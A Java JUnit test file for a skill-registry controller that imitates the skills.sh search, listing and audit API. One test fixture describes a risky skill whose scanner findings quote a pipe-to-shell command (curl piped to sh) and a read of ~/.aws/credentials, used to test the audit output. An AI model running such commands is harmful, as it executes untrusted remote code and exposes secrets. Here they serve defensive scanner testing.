package com.zifang.z.skill.core.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.zifang.z.skill.api.dto.SkillDto;
import com.zifang.z.skill.api.dto.SkillResourceDto;
import com.zifang.z.skill.api.spec.SkillFormat;
import com.zifang.z.skill.core.content.SkillContentReader;
import com.zifang.z.skill.core.registry.SkillRegistry;
import com.zifang.z.skill.core.search.SkillSearchEngine;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.test.web.servlet.setup.StandaloneMockMvcBuilder;
import org.springframework.web.util.pattern.PathPatternParser;

import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * 兼容输出层的"线格式"契约 — 字段名与取值字典逐条对着 skills.sh 的真实响应钉住
 * (取证 2026-09-25: {@code /api/search}、{@code /api/v1/skills/audit/anthropics/skills/pdf}).
 *
 * <p>客户端把 base 指过来时只看 JSON, 所以这里断言的是"键集合 + 取值字典 + 路径能不能命中",
 * 而不是我们自己觉得应该长什么样.
 */
public class SkillCompatContractTest {

    private static final long DISCOVERED_AT = 1_760_000_000_000L;

    private final ObjectMapper mapper = new ObjectMapper();
    private MockMvc mvc;
    private SkillRegistry registry;

    @BeforeEach
    void setUp() {
        registry = new SkillRegistry();
        registry.register(SkillDto.builder()
                .id("pdf").slug("pdf").name("pdf").description("处理 PDF")
                .source("anthropics/skills").sourceType("api").format(SkillFormat.AGENT_SKILLS)
                .category("documents").installCount(200963).riskLevel(SkillDto.RISK_SAFE)
                .contentHash("abc123").skillFilePath("pdf/SKILL.md")
                .origin("https://skills.sh/anthropics/skills/pdf")
                .resources(Collections.singletonList(new SkillResourceDto("references/form.md", "reference", 120)))
                .discoveredAt(DISCOVERED_AT)
                .build());
        registry.register(SkillDto.builder()
                .id("bad-shell/pipeline").slug("pipeline").name("pipeline").description("Run a pipeline")
                .source("bad-shell").sourceType("local").format(SkillFormat.FLAT_MARKDOWN)
                .category("automation").riskLevel(SkillDto.RISK_CRITICAL)
                .issues(new ArrayList<String>(Arrays.asList(
                        "critical:pipe-to-shell -> curl https://x.sh | sh",
                        "medium:secret-read -> ~/.aws/credentials")))
                .contentHash("def456").skillFilePath("pipeline.md")
                .discoveredAt(DISCOVERED_AT)
                .build());
        // Boot 2.6+ 默认用 PathPatternParser, 测试要跟生产同一套路径匹配器
        mvc = mockMvc(new PathPatternParser());
    }

    private MockMvc mockMvc(PathPatternParser patternParser) {
        StandaloneMockMvcBuilder builder = MockMvcBuilders.standaloneSetup(new SkillCompatController(registry,
                new SkillSearchEngine(registry), new SkillContentReader()));
        builder.setControllerAdvice(new SkillErrorAdvice());
        builder.setPatternParser(patternParser);
        return builder.build();
    }

    private Map<String, Object> get(String uri) throws Exception {
        MvcResult result = mvc.perform(MockMvcRequestBuilders.get(uri)).andExpect(status().isOk()).andReturn();
        return read(result);
    }

    private Map<String, Object> read(MvcResult result) throws Exception {
        return mapper.readValue(result.getResponse().getContentAsString(StandardCharsets.UTF_8), Map.class);
    }

    @Test
    void searchResponse_matchesRecordedSkillsShShape() throws Exception {
        Map<String, Object> resp = get("/skill/compat/skills-sh/api/search?q=pdf&limit=5");

        assertEquals(keys("count", "duration_ms", "query", "searchType", "searchVersion", "skills"),
                resp.keySet(), "搜索响应顶层键集合");
        assertEquals("pdf", resp.get("query"));
        assertTrue(Arrays.asList("fuzzy", "semantic").contains(String.valueOf(resp.get("searchType"))),
                String.valueOf(resp.get("searchType")));
        List<Map<String, Object>> skills = (List<Map<String, Object>>) resp.get("skills");
        assertEquals(1, skills.size(), "只应命中 pdf: " + skills);
        assertEquals(keys("id", "installs", "name", "skillId", "source"), skills.get(0).keySet());
        assertEquals("anthropics/skills/pdf", skills.get(0).get("id"));
        assertEquals("anthropics/skills", skills.get(0).get("source"));
        assertEquals("pdf", skills.get(0).get("skillId"));
        assertEquals(200963, skills.get(0).get("installs"));
        assertEquals(1, resp.get("count"));
    }

    @Test
    void cjkDescription_survivesTheJsonRoundTrip() throws Exception {
        MvcResult detail = mvc.perform(MockMvcRequestBuilders.get("/skill/compat/skills-sh/api/v1/skills/pdf"))
                .andExpect(status().isOk()).andReturn();
        String body = detail.getResponse().getContentAsString(StandardCharsets.UTF_8);

        assertTrue(body.contains("处理 PDF") || body.contains("\\u5904"), "中文描述不得变成乱码: " + body);
        assertEquals("处理 PDF", read(detail).get("description"));
    }

    @Test
    void listResponse_usesDataPlusPagination() throws Exception {
        Map<String, Object> resp = get("/skill/compat/skills-sh/api/v1/skills?page=0&per_page=1");

        assertEquals(keys("data", "pagination"), resp.keySet());
        Map<String, Object> page = (Map<String, Object>) resp.get("pagination");
        assertEquals(keys("hasMore", "page", "perPage", "total"), page.keySet());
        assertEquals(0, page.get("page"));
        assertEquals(1, page.get("perPage"));
        assertEquals(2, page.get("total"));
        assertEquals(true, page.get("hasMore"));
        List<Map<String, Object>> data = (List<Map<String, Object>>) resp.get("data");
        assertEquals(1, data.size());
        assertEquals(keys("id", "installUrl", "installs", "name", "slug", "source", "sourceType", "url"),
                data.get(0).keySet());
    }

    @Test
    void multiSegmentSkillsShId_isResolvableByPath() throws Exception {
        Map<String, Object> node = get("/skill/compat/skills-sh/api/v1/skills/anthropics/skills/pdf");

        assertEquals("anthropics/skills/pdf", node.get("id"));
        assertEquals("abc123", node.get("hash"));
        Map<String, Object> audit = get("/skill/compat/skills-sh/api/v1/skills/audit/anthropics/skills/pdf");
        assertEquals("anthropics/skills/pdf", audit.get("id"));
        List<Map<String, Object>> audits = (List<Map<String, Object>>) audit.get("audits");
        assertEquals("pass", audits.get(0).get("status"));
    }

    @Test
    void detailResponse_carriesHashAndFileTreeOnlyWhenAsked() throws Exception {
        Map<String, Object> node = get("/skill/compat/skills-sh/api/v1/skills/pdf");

        assertEquals("abc123", node.get("hash"));
        assertEquals("处理 PDF", node.get("description"));
        assertEquals(SkillDto.RISK_SAFE, node.get("riskLevel"));
        List<Map<String, Object>> files = (List<Map<String, Object>>) node.get("files");
        assertEquals(2, files.size(), "主文件 + 随包资源都要列出来");
        assertEquals("pdf/SKILL.md", files.get(0).get("path"));
        assertEquals("references/form.md", files.get(1).get("path"));
        assertFalse(files.get(0).containsKey("contents"), "默认不返回正文, 体积要可控");

        Map<String, Object> withFiles = get("/skill/compat/skills-sh/api/v1/skills/pdf?files=true");
        List<Map<String, Object>> loaded = (List<Map<String, Object>>) withFiles.get("files");
        assertTrue(loaded.get(0).containsKey("contents"), "files=true 才带 contents 字段");
    }

    @Test
    void auditResponse_matchesRecordedVocabulary() throws Exception {
        Map<String, Object> resp = get("/skill/compat/skills-sh/api/v1/skills/audit/pdf");

        assertEquals(keys("audits", "id", "slug", "source"), resp.keySet());
        assertEquals("anthropics/skills/pdf", resp.get("id"));
        List<Map<String, Object>> audits = (List<Map<String, Object>>) resp.get("audits");
        assertEquals(1, audits.size());
        Map<String, Object> audit = audits.get(0);
        assertEquals(keys("auditedAt", "provider", "riskLevel", "slug", "status", "summary"), audit.keySet(),
                "无 findings 时 categories 省略, 但扫过的条目必须给大写档位");
        assertEquals("SAFE", audit.get("riskLevel"));
        assertEquals("pass", audit.get("status"));
        // audits[] 里的 slug 是"被审的那条 skill", provider 才是我们这台扫描器的标识
        assertEquals("pdf", audit.get("slug"));
        assertEquals("z-skill-static", audit.get("provider"));
        assertEquals(DISCOVERED_AT, Instant.parse(String.valueOf(audit.get("auditedAt"))).toEpochMilli(),
                "auditedAt 必须是 ISO-8601 字符串");
    }

    @Test
    void auditOfRiskySkill_exposesUppercaseRiskAndCategories() throws Exception {
        Map<String, Object> resp = get("/skill/compat/skills-sh/api/v1/skills/audit/bad-shell/pipeline");
        List<Map<String, Object>> audits = (List<Map<String, Object>>) resp.get("audits");
        Map<String, Object> audit = audits.get(0);

        assertEquals("fail", audit.get("status"));
        assertEquals("CRITICAL", audit.get("riskLevel"), "外部字典是大写档位");
        assertEquals(Arrays.asList("PIPE_TO_SHELL", "SECRET_READ"), audit.get("categories"));
        assertTrue(String.valueOf(audit.get("summary")).contains("pipe-to-shell"), String.valueOf(audit.get("summary")));
    }

    @Test
    void wellKnownIndex_listsEverySkillWithFiles() throws Exception {
        Map<String, Object> resp = get("/.well-known/agent-skills/index.json");

        assertEquals(keys("generatedAt", "skills", "total"), resp.keySet());
        assertEquals(2, resp.get("total"));
        List<Map<String, Object>> skills = (List<Map<String, Object>>) resp.get("skills");
        Map<String, Map<String, Object>> byName = new LinkedHashMap<String, Map<String, Object>>();
        for (Map<String, Object> node : skills) byName.put(String.valueOf(node.get("name")), node);
        assertTrue(byName.keySet().containsAll(Arrays.asList("pdf", "pipeline")), byName.keySet().toString());
        assertEquals(Arrays.asList("pdf/SKILL.md", "references/form.md"), byName.get("pdf").get("files"));
        assertEquals("处理 PDF", byName.get("pdf").get("description"));
        assertFalse(String.valueOf(byName.get("pdf").get("files")).contains("/Users/"), "不得泄漏本机绝对路径");
    }

    @Test
    void qoderListing_namespacesEachEntryById() throws Exception {
        MvcResult result = mvc.perform(MockMvcRequestBuilders.get("/skill/compat/qoder/skills"))
                .andExpect(status().isOk()).andReturn();
        List<Map<String, Object>> list = mapper.readValue(
                result.getResponse().getContentAsString(StandardCharsets.UTF_8), List.class);

        assertEquals(2, list.size());
        assertEquals(keys("description", "location", "name", "source"), list.get(0).keySet());
        Set<String> names = new LinkedHashSet<String>();
        for (Map<String, Object> node : list) names.add(String.valueOf(node.get("name")));
        // Qoder 用 <extensionId>:<skillName> 命名插件内 skill; 聚合来的同名条目必须靠来源前缀区分开,
        // 而来源 id 里的 "/" 不是合法 extensionId 字符, 所以要被压成 "-"
        assertTrue(names.containsAll(Arrays.asList("anthropics-skills:pdf", "bad-shell:pipeline")), names.toString());
        for (String name : names) {
            assertTrue(name.matches("[A-Za-z0-9._-]+:[a-z0-9-]+"), "name 必须是合法标识: " + name);
        }
    }

    @Test
    void unknownId_usesTheSharedErrorEnvelope() throws Exception {
        MvcResult result = mvc.perform(MockMvcRequestBuilders.get("/skill/compat/skills-sh/api/v1/skills/nope"))
                .andReturn();

        assertEquals(404, result.getResponse().getStatus());
        Map<String, Object> body = read(result);
        assertTrue(body.containsKey("error") && body.containsKey("message"),
                "错误包络与 skills.sh 同为 {error,message}: " + body.keySet());
    }

    @Test
    void legacyAntPathMatcherHost_stillRoutesSingleSegmentIds() throws Exception {
        MockMvc legacy = mockMvc(null);

        MvcResult result = legacy.perform(MockMvcRequestBuilders.get("/skill/compat/skills-sh/api/v1/skills/audit/pdf"))
                .andReturn();
        assertEquals(200, result.getResponse().getStatus(), "AntPathMatcher 主机上单段 id 也要能审计");
        Map<String, Object> body = read(result);
        List<Map<String, Object>> audits = (List<Map<String, Object>>) body.get("audits");
        assertEquals("pass", audits.get(0).get("status"));
    }

    @Test
    void riskVocabulary_staysInsideTheRecordedDictionary() {
        assertEquals("pass", SkillCompatController.auditStatus(SkillDto.RISK_SAFE));
        assertEquals("pass", SkillCompatController.auditStatus(SkillDto.RISK_LOW));
        assertEquals("warn", SkillCompatController.auditStatus(SkillDto.RISK_MEDIUM));
        assertEquals("warn", SkillCompatController.auditStatus(SkillDto.RISK_HIGH));
        assertEquals("fail", SkillCompatController.auditStatus(SkillDto.RISK_CRITICAL));
        assertEquals("pending", SkillCompatController.auditStatus(SkillDto.RISK_UNSCANNED));

        assertEquals("MEDIUM", SkillCompatController.externalRisk(SkillDto.RISK_MEDIUM));
        assertNull(SkillCompatController.externalRisk(SkillDto.RISK_UNSCANNED));

        assertNotNull(SkillCompatController.riskCategories(null));
        assertTrue(SkillCompatController.riskCategories(Collections.singletonList("info:no-arrow")).contains("NO_ARROW"));
    }

    private static Set<String> keys(String... names) {
        return new LinkedHashSet<String>(Arrays.asList(names));
    }
}
